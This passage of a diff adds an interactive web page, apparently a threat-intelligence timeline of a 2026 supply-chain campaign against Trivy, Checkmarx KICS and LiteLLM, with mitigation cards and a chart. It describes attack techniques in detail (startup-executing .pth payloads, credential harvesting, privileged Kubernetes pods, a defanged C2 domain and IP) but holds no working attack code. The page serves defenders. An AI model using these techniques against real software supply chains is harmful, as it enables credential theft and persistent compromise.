+ft:"Four days after Trivy, TeamPCP pivoted to Checkmarx.\n\nKICS GitHub Action (12:58\u201316:50 UTC): All 35 tags hijacked via cx-plugins-releases account (ID 225848595). Repository taken down at 16:50 UTC.\n\nast-github-action: v2.3.28 confirmed compromised (likely all tags).\n\nOpenVSX extensions (12:53 UTC): ast-results v2.53.0 and cx-dev-assist v1.7.0 published 12 seconds apart via ast-phoenix account. On activation, environmentAuthChecker.js checks for cloud credentials, downloads second-stage from checkmarx[.]zone. VS Code Marketplace unaffected.\n\nTactical evolutions:\n\u2022 New C2: checkmarx[.]zone (83.142.209.11) \u2014 different from Trivy C2\n\u2022 Fallback repo: docs-tpcp (not tpcp-docs)\n\u2022 New K8s persistence code\n\u2022 Vendor-specific typosquat in CI/CD logs",
+fu:"KICS is Checkmarx\u2019s open-source IaC scanner for Terraform, Kubernetes, Dockerfiles, CloudFormation, Ansible. ~1% of trivy-action\u2019s public usage but widely adopted in enterprise.\n\nExposure: 4-hour window. OpenVSX extensions available ~3 hours.\n\nCheckmarx: \u201cWe are not aware of any impact to customer data or production environments.\u201d\n\nSysdig: \u201cRuntime detection proved effective against both waves because the underlying behavior is the same: a CI runner uploads encrypted data to an external domain not part of the original workflow.\u201d",
+fs:"Functionally identical stealer targeting SSH, cloud, K8s, crypto credentials. Enhancements:\n\u2022 K8s persistence (privileged pod deployment)\n\u2022 New C2 domain defeats domain-based blocking\n\u2022 Fallback repo renamed\n\nSysdig: \u201cThe identical payload, encryption scheme, and tpcp.tar.gz naming convention confirm same threat actor.\u201d\n\nSysdig noted the vendor-specific typosquat is deliberate: analysts reviewing logs see traffic to what appears to be the vendor\u2019s own domain."},
+{n:"7",t:"LITELLM POISONED",d:"March 24, 2026",a:"TeamPCP",v:"Unpinned Trivy in CI/CD + long-lived PyPI token",
+desc:"LiteLLM\u2019s CI/CD ran Trivy (unpinned). Compromised Trivy exfiltrated PYPI_PUBLISH token. Published 1.82.7 and 1.82.8 to PyPI. v1.82.8 uses .pth file: executes on every Python startup, no import needed.",
+u:"95M monthly downloads. 36% of cloud environments. API gateway for 100+ LLM providers. Transitive dep for 2000+ packages including DSPy, MLflow.",
+s:"Every credential type: SSH, cloud, K8s, DB, crypto, .env, shell history, SSL keys, CI/CD secrets. LiteLLM holds every LLM API key by design.",
+ft:"LiteLLM\u2019s CI/CD pulled Trivy via apt without a version pin. During the compromise window, the Trivy action exfiltrated the PYPI_PUBLISH token.\n\nPublished versions:\n\u2022 1.82.7 (10:39 UTC): Payload in litellm/proxy/proxy_server.py. 12 lines of obfuscated code, executes on import.\n\u2022 1.82.8 (10:52 UTC): Added litellm_init.pth (34,628 bytes). Python\u2019s site module processes .pth files at interpreter startup \u2014 lines with \u2018import\u2019 execute as code. Runs on every Python process: pip, Jupyter, Ansible, unit tests.\n\nQuarantined by PyPI at ~11:25 UTC (~3 hour window). Entire package quarantined.\n\nDiscovered accidentally: Callum McMahon\u2019s Cursor MCP plugin pulled LiteLLM transitively. The .pth triggered on every Python startup, spawning subprocesses that triggered it again \u2014 exponential fork bomb crashed the machine.\n\nKarpathy: \u201cIf the attacker hadn\u2019t introduced this bug, the compromise might have gone undetected for days or weeks.\u201d\n\nExfil domain litellm.cloud registered March 23 (NOT litellm.ai). Attackers defaced BerriAI repos. Issue #24512 buried with 28 spam comments in 43 seconds from 25 bot accounts (76% overlap with Trivy botnet).",
+fu:"LiteLLM: ~97M monthly downloads (3.4M/day). 40K+ GitHub stars. Present in 36% of cloud environments (Wiz). Universal API translator for 100+ LLM providers. Transitive dependency for DSPy, MLflow, Open Interpreter, 2000+ packages.\n\nThe discoverer never directly installed LiteLLM \u2014 chain: Cursor IDE \u2192 MCP plugin \u2192 LiteLLM.\n\nMandiant CTO (RSAC 2026): \u201cWe know of over 1,000 impacted SaaS environments. That will probably expand to 10,000+.\u201d\n\nTeamPCP claims \u201chundreds of thousands of devices.\u201d Now collaborating with LAPSUS$.\n\nWiz: \u201cThe open source supply chain is collapsing in on itself.\u201d",
+fs:"Three-stage payload:\n1. Credential harvester: SSH keys, env vars, AWS/GCP/Azure, K8s, CI/CD, Docker, database, crypto wallets, .env files, shell history, SSL keys, git credentials.\n2. K8s lateral movement: Deploys privileged pods (node-setup-*) to every node.\n3. Persistent backdoor: sysmon.service polls checkmarx[.]zone/raw every 50 min. Kill switch: aborts if response contains \u201cyoutube\u201d (Rick Roll).\n\nThe cruelest irony: LiteLLM is an API key management gateway. The attacker targeted the one package that by definition holds every LLM API key.\n\nTeamPCP: \u201cWe\u2019re gonna be around for a long time stealing terabytes of trade secrets with our new partners. Many of your favourite security tools will be targeted in the months to come.\u201d"}
+];
+
+const M=[
+{t:"Secure workflow config",p:"80%",s:"pull_request_target documented as dangerous since 2020. OpenSSF Scorecard flags it. GitHub changed defaults Dec 2025. Trivy\u2019s workflow present since Oct 2025, never patched. Egress monitoring existed.",
+f:"GitHub Security Lab published \u201cPreventing Pwn Requests\u201d in 2020. OpenSSF Scorecard automatically flags this pattern. GitHub changed defaults December 2025. StepSecurity Harden-Runner (free for public repos, 12,000+ repos) would have detected the outbound connection. The aqua-bot PAT had org-wide repo scope; fine-grained tokens have been available since 2022."},
+{t:"Incident response fundamentals",p:"100%",s:"Complete credential rotation is IR 101. Long-lived PATs should be OIDC tokens. Service account inventory is standard hygiene. Post-rotation verification should confirm old creds are dead. None done.",
+f:"The only node that is 100% preventable with decades-old practices. Enumerate all credentials, rotate atomically, replace long-lived PATs with OIDC tokens (available since 2021), verify rotation completeness, map blast radius of cross-org accounts. Aqua\u2019s update 22 days later: \u201cactively focused on validating all access paths.\u201d"},
+{t:"SHA pinning for Actions",p:"90%",s:"Pinning to commit SHAs documented since 2020. GitHub org-level enforcement since Aug 2025. Immutable releases same month. Zero of 10,000+ workflows used SHA pinning.",
+f:"Pinning to full 40-char commit SHAs is the only immutable reference. GitHub org policies enforce this since Aug 2025. Immutable releases prevent tag modification. GPG signatures on the original commits would flag unsigned imposters. StepSecurity Pi\u00f1ata automates SHA pinning. Dependabot supports SHA-pinned updates. The sole uncompromised tag (0.35.0) was protected by immutable releases."},
+{t:"OIDC trusted publishing (npm)",p:"75%",s:"npm trusted publishing eliminates long-lived tokens. Available since 2024. Short-lived OIDC tokens expire in minutes. Stolen tokens useless. Lockfiles prevent bumped patches. Adoption near zero.",
+f:"npm Trusted Publishing creates OIDC trust between npm and CI/CD providers. Short-lived tokens scoped to specific workflow runs. No stored token to steal. Package lockfiles with integrity hashes prevent pulling bumped versions. Provenance attestations link packages to source commits. The \u201cdisallow tokens\u201d setting makes token theft irrelevant. PyPI has offered this since 2023. Both are free. Both have negligible adoption."},
+{t:"Image digest pinning + content trust",p:"70%",s:"Docker tags are mutable. Digest pinning (sha256) is immutable. Docker Content Trust/Sigstore provide signing. Same unrotated credential from Node 2. Port 2375 access controls limit wiper spread.",
+f:"docker pull by digest is immutable. Docker Content Trust and Sigstore/cosign provide keyless signing. The defacement used the same Argon-DevOps-Mgt PAT from Node 2. Network segmentation and Docker API controls (port 2375) limit lateral movement. 70% reflects that Docker/defacement vectors are fully preventable; the geopolitically targeted wiper is novel."},
+{t:"SHA pinning + credential compartments",p:"80%",s:"SHA pinning stops tag poisoning. Credential compartmentalization: Vendor A\u2019s stolen tokens should never reach Vendor B. Build/publish separation supported by GitHub Actions environments. Adoption negligible.",
+f:"SHA pinning prevents tag poisoning (same as Node 3). The additional lesson: credential compartmentalization across vendor boundaries. Scanning steps should not have publish tokens. Different vendors\u2019 credentials should be in separate GitHub Actions environments. Sysdig: \u201cRuntime detection works because the behavior is the same: encrypted data uploaded to an unexpected domain.\u201d"},
+{t:"PyPI trusted publishers + pinned deps",p:"85%",s:"PyPI Trusted Publishing (OIDC) since 2023. LiteLLM used a long-lived token. Pipeline pulled Trivy unpinned via apt. Scanning step had publish access. .pth detection exists.",
+f:"PyPI Trusted Publishing (Trail of Bits + Google OSST, 2023) mints 15-minute tokens. No stored secret to steal. LiteLLM\u2019s pipeline pulled Trivy unpinned via apt. The scanning step had PYPI_PUBLISH access. GitHub Actions environments support isolation. Snyk: \u201cHash verification passes because the malicious content was published with legitimate credentials. Only eliminating the stored credential prevents this.\u201d"}
+];
+
+function buildTimeline(){
+const el=document.getElementById('timeline-nodes');
+N.forEach((d,i)=>{
+const card=document.createElement('div');
+card.className='tl-node';
+card.innerHTML=`
+<div class="tl-dot"><span class="num">${d.n}</span></div>
+<div class="tl-card" onclick="this.classList.toggle('open')">
+<div class="tl-card-header">
+<div class="tl-card-title">${d.t}</div>
+<div class="tl-card-date">${d.d}</div>
+<div class="tl-card-actor">${d.a}</div>
+</div>
+<div class="tl-card-body">
+<div class="vector-tag">${d.v}</div>
+<div class="label dim">DESCRIPTION</div>
+<div class="val">${d.desc}</div>
+<div class="label blue">USERS / SCALE</div>
+<div class="val blue">${d.u}</div>
+<div class="label red">STOLEN / DAMAGE</div>
+<div class="val red">${d.s}</div>
+</div>
+<div class="tl-expand">\u25B8 CLICK FOR FULL INTELLIGENCE REPORT</div>
+<div class="tl-detail">
+<div class="dt">FULL TECHNIQUE ANALYSIS</div>
+<div class="dd">${d.ft.replace(/\n/g,'<br>')}</div>
+<div class="dt blue">COMPLETE IMPACT ASSESSMENT</div>
+<div class="dd">${d.fu.replace(/\n/g,'<br>')}</div>
+<div class="dt red">COMPLETE THEFT & DAMAGE REPORT</div>
+<div class="dd">${d.fs.replace(/\n/g,'<br>')}</div>
+</div>
+</div>`;
+el.appendChild(card);
+});
+}
+
+function buildMit(){
+const el=document.getElementById('mit-strip');
+M.forEach((d,i)=>{
+el.innerHTML+=`<div class="mit-card" onclick="this.classList.toggle('open')">
+<div class="pct">${d.p}</div>
+<div class="pct-label">MITIGATION</div>
+<div class="mit-title">${d.t}</div>
+<div class="mit-text">${d.s}</div>
+<div class="mit-full">${d.f}</div>
+</div>`;
+});
+}
+
+function buildChart(){
+const svg=document.getElementById('awareChart');
+const W=1150,H=200,px=20,py=14,cw=W-2*px,ch=H-2*py-18;
+let s=`<defs><linearGradient id="spk" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#ffb020" stop-opacity="0.5"/><stop offset="100%" stop-color="#ffb020" stop-opacity="0"/></linearGradient></defs>`;
+const ev=[["Feb 20",0],["Feb 28",.12],["Mar 1",.15],["Mar 19",.55],["Mar 20",.62],["Mar 22",.74],["Mar 23",.83],["Mar 24",.93]];
+ev.forEach(([l,p])=>{const x=px+p*cw;s+=`<line x1="${x}" y1="${py}" x2="${x}" y2="${py+ch}" stroke="#1a2235" stroke-width=".5" stroke-dasharray="2 4"/><text x="${x}" y="${H-4}" font-size="8" fill="#4a4940" text-anchor="middle" font-family="Outfit,sans-serif">${l}</text>`;});
+const fY=py+ch-14;
+const fp=[[0,0],[.12,-4],[.15,0],[.55,-8],[.62,-4],[.74,-4],[.83,-8]];
+s+=`<path d="${fp.map(([p,b],i)=>`${i?'L':'M'}${px+p*cw} ${fY+b}`).join(' ')}" fill="none" stroke="#4a4940" stroke-width="1.5"/>`;
+const pubs=[[.12,"StepSecurity",-20],[.15,"Aqua",-34],[.55,"Socket + Wiz",-20],[.62,"Aikido",-34],[.74,"Wiper",-20],[.83,"KrebsOnSecurity",-34]];
+pubs.forEach(([p,l,y])=>{const x=px+p*cw;s+=`<circle cx="${x}" cy="${fY-4}" r="2" fill="#4a4940"/><text x="${x}" y="${fY+y}" font-size="7" fill="#4a4940" text-anchor="middle" font-family="Outfit,sans-serif">${l}</text>`;});
+const mx=px+.35*cw;
+s+=`<rect x="${mx-55}" y="${fY-44}" width="110" height="22" rx="3" fill="#06080F" stroke="#4a4940" stroke-width=".3"/><text x="${mx}" y="${fY-34}" font-size="8" fill="#4a4940" text-anchor="middle" font-family="Outfit,sans-serif" font-weight="500">No one is listening</text><text x="${mx}" y="${fY-26}" font-size="6" fill="#4a4940" text-anchor="middle" font-family="Outfit,sans-serif">(security community only)</text>`;
+const eZ=py+ch-2,eT=py+8,eR=eZ-eT;
+const es=[[0,0],[.12,0],[.15,0],[.54,0],[.55,.05],[.62,.15],[.74,.35],[.83,.5],[.93,1]];
+let ep='';es.forEach(([p,f],j)=>{const x=px+p*cw,y=eZ-f*eR;if(!j)ep=`M${x} ${y}`;else{const[,pf]=es[j-1];ep+=` L${x} ${eZ-pf*eR} L${x} ${y}`;}});
+s+=`<path d="${ep}" fill="none" stroke="#ff3b3b" stroke-width="1.5" opacity=".7"/>`;
+es.filter(([,f])=>f>0).forEach(([p,f])=>{s+=`<circle cx="${px+p*cw}" cy="${eZ-f*eR}" r="2.5" fill="#ff3b3b" opacity=".7"/>`;});
+const sx=px+.93*cw,st=py+6;
+s+=`<path d="M${sx-15} ${fY} L${sx} ${st} L${sx+15} ${fY} Z" fill="url(#spk)" opacity=".5"/>`;
+s+=`<path d="M${px+.83*cw} ${fY-8} L${sx} ${st}" fill="none" stroke="#ffb020" stroke-width="2.5"/>`;
+s+=`<circle cx="${sx}" cy="${st}" r="4" fill="#ffb020"/><circle cx="${sx}" cy="${st}" r="8" fill="#ffb020" opacity=".2"/>`;
+const kx=sx-240,ky=st;
+s+=`<rect x="${kx}" y="${ky}" width="228" height="36" rx="4" fill="#1a1508" stroke="#ffb020" stroke-width=".5"/>`;
+s+=`<text x="${kx+8}" y="${ky+13}" font-size="10" fill="#ffb020" font-family="Outfit,sans-serif" font-weight="600">Andrej Karpathy posts on X</text>`;
+s+=`<text x="${kx+8}" y="${ky+24}" font-size="7" fill="#C8922A" font-family="Outfit,sans-serif">"Software horror: litellm PyPI supply chain attack"</text>`;
+s+=`<text x="${kx+8}" y="${ky+33}" font-size="6" fill="#8a8880" font-family="Outfit,sans-serif">NOW the AI developer community pays attention.</text>`;
+s+=`<line x1="${kx+228}" y1="${ky+18}" x2="${sx-10}" y2="${st}" stroke="#ffb020" stroke-width=".5" stroke-dasharray="3 3"/>`;
+svg.innerHTML=s;
+}
+
+buildTimeline();buildMit();buildChart();
+
+const obs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('visible')})},{threshold:0.15});
+document.querySelectorAll('.tl-node').forEach(n=>obs.observe(n));
+</script>
+</body>
+</html>
